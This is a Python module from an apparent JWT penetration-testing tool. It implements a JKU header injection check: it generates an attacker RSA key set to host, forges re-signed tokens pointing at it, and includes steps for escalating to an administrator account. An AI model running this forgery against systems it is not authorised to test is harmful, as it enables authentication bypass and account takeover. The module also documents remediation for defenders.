"""Attack 5: JKU injection, point the `jku` header at an attacker-hosted key set.

Like jwk injection, this abuses a server that trusts a verification key the token names itself.
The difference is where the key lives: instead of embedding the public key in a `jwk` header, the
token carries a `jku` header, a URL, and the server fetches a JWK Set from it to find the key.
If the server fetches whatever URL the token gives (no allow-list of trusted hosts), an attacker
hosts their OWN key set and signs the token with the matching private key; the server downloads
the attacker's public key and verifies happily.

The tool cannot invent a URL the target can reach, so hosting stays the tester's job: we GENERATE
the keypair and hand over the exact JWK Set to host (`generate_material`), the tester hosts it
somewhere the target can fetch, a local lab's own host, a VPS, a tunnel, and pastes that URL
back. Only then do we forge a token whose `jku` points at it, signed by the private key that
matches the hosted public key, and resend the request to confirm the server trusted it.
"""

import json
import uuid

from jwtpen.core.jwt_utils import decode, encode, construct_jwt, sign_rsa
from jwtpen.core.keys import (
    generate_rsa_keypair, public_key_to_jwks, public_key_pem, private_key_pem,
    load_private_key_pem,
)
from jwtpen.core.raw_request import parse_request, swap_token
from jwtpen.core.checker import send, classify, resembles, ACCEPTED
from jwtpen.attacks.base import Finding, VULNERABLE, NOT_VULNERABLE, INCONCLUSIVE, HIGH

# This check needs the tester to host a key set and give its URL; the UI uses these to show a
# "Hosting required" control (the parallel of weak_secret's wordlist control) instead of running
# blind. The hint spells out the one thing the tool can't do for you: make the URL reachable.
REQUIRES_HOSTED_JWKS = True
HOSTED_JWKS_BADGE = "Hosting required"
HOSTED_JWKS_HINT = (
    "The tool generates the RSA key set below. Host it at a URL the target server can reach, "
    "then paste that URL here, jku injection only works if the target can fetch the key set."
)


def generate_material(kid=None):
    """Generate the attacker keypair and the JWK Set the tester must host for this attack.

    Returns a dict the prepare step hands to the UI: the `jwks_text` to copy and host, the `kid`
    naming the key, and the `private_key_pem` that travels back with the scan so `run` can sign
    the forged token with the key that matches the hosted public key. We pick a random `kid` so
    the forged token's header can point the server straight at our key inside the set.
    """
    private_key = generate_rsa_keypair()
    kid = kid or str(uuid.uuid4())
    jwks = public_key_to_jwks(private_key.public_key(), kid=kid, alg="RS256")
    return {
        "kid": kid,
        "jwks": jwks,
        "jwks_text": json.dumps(jwks, indent=2),
        "private_key_pem": private_key_pem(private_key).decode(),
        "public_key_pem": public_key_pem(private_key).decode(),
    }


def forge_token(token, jku_url, private_key, kid):
    """Forge a copy of `token` whose `jku` header points at `jku_url`, signed by `private_key`.

    We force `alg` to RS256 (our key is RSA), set `jku` to the hosted URL, and set `kid` to the
    one that names our key inside the hosted set, so the server picks our key out of it. The
    payload is copied through untouched, so acceptance proves exactly one thing: the server
    fetched and trusted a key set at a URL the token chose.
    """
    header, payload, _ = decode(token)

    header["alg"] = "RS256"
    header["jku"] = jku_url
    header["kid"] = kid

    signing_input = encode(header, payload)
    signature = sign_rsa(signing_input, private_key, "RS256")
    return construct_jwt(signing_input, signature)


# --- Static content for this attack's report section ---
NAME = "Attacker Key Set Hosted via jku Header (jku Injection)"
DESCRIPTION = "Checks whether the server fetches and trusts a key set from a URL named in the token's jku header."

_SUMMARY = {
    VULNERABLE: ("The server accepted a token whose jku header pointed at an attacker-hosted key "
                 "set and whose signature matched a key in it. Because the server fetches and trusts "
                 "a key set from a URL the token chooses, an attacker can host their own key and "
                 "forge authentication for any user."),
    NOT_VULNERABLE: ("The server rejected a token whose jku header pointed at an attacker-hosted "
                     "key set, which indicates it does not fetch verification keys from URLs the "
                     "token supplies."),
    INCONCLUSIVE: ("The result could not be judged automatically: the endpoint responded the same "
                   "way with and without a valid token, so accepted and rejected tokens could not "
                   "be told apart."),
}

_REPRODUCTION = [
    "Log in and capture your session JWT from the request.",
    "Generate a fresh RSA keypair (for example with the tool's key helper or openssl).",
    'Build a JWK Set, {"keys":[{"kty":"RSA","kid":...,"n":...,"e":...}]}, containing your PUBLIC key, and host it at a URL the target server can reach.',
    'Rebuild the token: keep the payload, set the header "alg" to "RS256", set "jku" to your hosted URL, and set "kid" to the key id in your key set.',
    "Sign this new token with your PRIVATE key and resend the request. If you remain logged in, the server fetched your key set and trusted it. That is the vulnerability.",
    'To demonstrate impact, edit a claim in the payload, for example change "sub" to an administrator, re-sign with your private key, and resend.',
    "If the server grants that account's access, you have forged a privileged token using a key you host. Re-test other authenticated endpoints too, since this can differ per route.",
]

_REMEDIATION = (
    "Never fetch verification keys from a URL the token supplies. Ignore the jku (and jwk/x5u/x5c) "
    "header parameters, and verify every token only against keys from a server-side trusted store, "
    "using an explicit allow-list of strong algorithms. If a jku-style endpoint is genuinely needed, "
    "restrict it to an allow-list of trusted hosts you control. Prefer a maintained library that "
    "does not honour token-supplied key URLs by default."
)

# Shown only when the attack succeeded: how to reuse the artifacts in the evidence by hand.
_MANUAL_FOLLOWUP = [
    "The forged token in the evidence is signed by the attacker keypair shown alongside it, and its jku header points at the key set you hosted. To craft further tokens by hand, paste the forged token into a JWT decoder, edit the payload (for example change \"sub\"), and re-sign using the attacker Private Key (PEM) from the evidence.",
    "Keep the key set hosted at the same URL while you test: the server re-fetches it to verify each token, so taking it down will make otherwise-valid forged tokens fail.",
    "Confirm impact in the application itself, not only in the decoder: resend each hand-edited token to the target and check the privileged action actually succeeds.",
]

_REFERENCES = [
    {"label": "OWASP Top 10: Identification and Authentication Failures",
     "url": "https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/"},
    {"label": "RFC 7515: JSON Web Signature (JWS), \"jku\" (JWK Set URL) Header Parameter",
     "url": "https://datatracker.ietf.org/doc/html/rfc7515#section-4.1.2"},
    {"label": "RFC 7517: JSON Web Key (JWK)",
     "url": "https://datatracker.ietf.org/doc/html/rfc7517"},
]


def _inconclusive_no_hosting():
    """The Finding returned when the tester hasn't hosted a key set / given its URL yet.

    jku injection can't run without a URL the target can fetch, so, like weak_secret with no
    wordlist, we report honestly that the check did not run rather than guessing a verdict.
    """
    return Finding(
        attack=NAME,
        status=INCONCLUSIVE,
        severity=HIGH,
        summary=("This check could not run because no hosted key set URL was provided: jku injection "
                 "needs a JWK Set hosted at a URL the target can reach, and the token's jku header "
                 "pointed at it."),
        methodology=["No jku URL was provided, so no forged token could be built or sent."],
        reproduction=_REPRODUCTION,
        manual_followup=[],
        evidence={},
        remediation=_REMEDIATION,
        references=_REFERENCES,
    )


def run(raw_request, token, scheme, options=None):
    """Run the jku-injection check end to end and return a Finding.

    `options` carries this check's hosting settings from the prepare step and the tester:
    `jku_url` (where they hosted the key set), `private_key_pem` and `kid` (the generated key that
    matches the hosted public key). Without a URL and key the check can't run, so it reports
    INCONCLUSIVE. Otherwise we forge a token whose jku points at the hosted set, send it, and
    classify it against the known-good / known-bad baselines, exactly like the other key attacks.
    """
    options = options or {}
    jku_url = (options.get("jku_url") or "").strip()
    private_key_pem_text = options.get("private_key_pem") or ""
    kid = options.get("kid")
    if not jku_url or not private_key_pem_text or not kid:
        return _inconclusive_no_hosting()

    private_key = load_private_key_pem(private_key_pem_text)

    parsed = parse_request(raw_request)
    good = send(parsed, scheme)
    bad = send(parse_request(swap_token(raw_request, token, "INVALID")), scheme)
    url = scheme + "://" + parsed["headers"]["Host"] + parsed["path"]

    forged_token = forge_token(token, jku_url, private_key, kid)

    forged = None
    if resembles(good, bad):
        # The app answers the same whether or not you're authenticated: no verdict is trustworthy.
        status = INCONCLUSIVE
    else:
        response = send(parse_request(swap_token(raw_request, token, forged_token)), scheme)
        if classify(good, bad, response) == ACCEPTED:
            forged = response
        status = VULNERABLE if forged is not None else NOT_VULNERABLE

    methodology = [
        "Generated a fresh RSA keypair and built a JWK Set containing its public key for you to host.",
        f"Set the token's jku header to the hosted URL ({jku_url}) and the kid to the hosted key.",
        'Set the header algorithm to "RS256", signed the token with the matching private key, and resent your original request with it.',
    ]
    if forged is not None:
        methodology.append("The server accepted it, so it fetched the key set from the token's URL and trusted it.")
    elif status == NOT_VULNERABLE:
        methodology.append("The server rejected it, so a key set fetched from a token-supplied URL is not trusted.")
    else:
        methodology.append("The endpoint responded the same way with and without a valid token, so the result could not be judged automatically.")

    evidence = {
        "Target URL": url,
        "Hosted Key Set URL (jku)": jku_url,
        "Expected Response (Valid Token)": f"HTTP {good.status_code}",
    }
    manual_followup = []
    if forged is not None:
        evidence["Received Response (Forged Token)"] = f"HTTP {forged.status_code}"
        evidence["Hosted Key (kid)"] = kid
        evidence["Forged Token"] = forged_token
        evidence["Attacker Public Key (PEM)"] = public_key_pem(private_key).decode()
        evidence["Attacker Private Key (PEM)"] = private_key_pem(private_key).decode()
        manual_followup = _MANUAL_FOLLOWUP

    return Finding(
        attack=NAME,
        status=status,
        severity=HIGH,
        summary=_SUMMARY[status],
        methodology=methodology,
        reproduction=_REPRODUCTION,
        manual_followup=manual_followup,
        evidence=evidence,
        remediation=_REMEDIATION,
        references=_REFERENCES,
    )
